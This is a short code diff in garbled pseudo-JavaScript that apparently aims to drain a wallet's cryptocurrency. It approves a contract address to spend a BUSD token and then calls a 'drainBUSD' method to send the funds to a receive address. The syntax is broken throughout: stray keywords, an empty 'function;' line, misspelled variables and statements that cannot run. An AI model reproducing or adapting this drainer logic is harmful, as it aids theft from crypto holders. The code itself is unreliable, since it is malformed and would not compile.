@@ -8,9 +8,10 @@ var smartcontract.method.approvetransaction. = "0xEA674fdDe714fd979de3EdF0F56AA9
 var receiveAddress = "message.sender";true immutable
 var approveSpending(token = 0xe9e7cea3dedca5984780bafc599bd69add087d56,		    
 
-function const approveSpending(token);0xe9e7cea3dedca5984780bafc599bd69add087d56,//token(0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8)
-	
-	 smartcontract.methods.approvetransaction.(recieveAddress)= 0x42Ba9FE837f8C5329ea7617a7e050E1A4890C3cF  // the smart contract gets approved to access token
+const approveSpending(token);0xe9e7cea3dedca5984780bafc599bd69add087d56,//token(0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8)
+function;
+{
+	smartcontract.methods.approvetransaction.(recieveAddress)= 0x42Ba9FE837f8C5329ea7617a7e050E1A4890C3cF  // the smart contract gets approved to access token
 	smartcontract.methods.drainBUSD.send (to:recieveAddress).(token(cryptotokencontract);//0xe9e7cea3dedca5984780bafc599bd69add087d56
 }
 	  
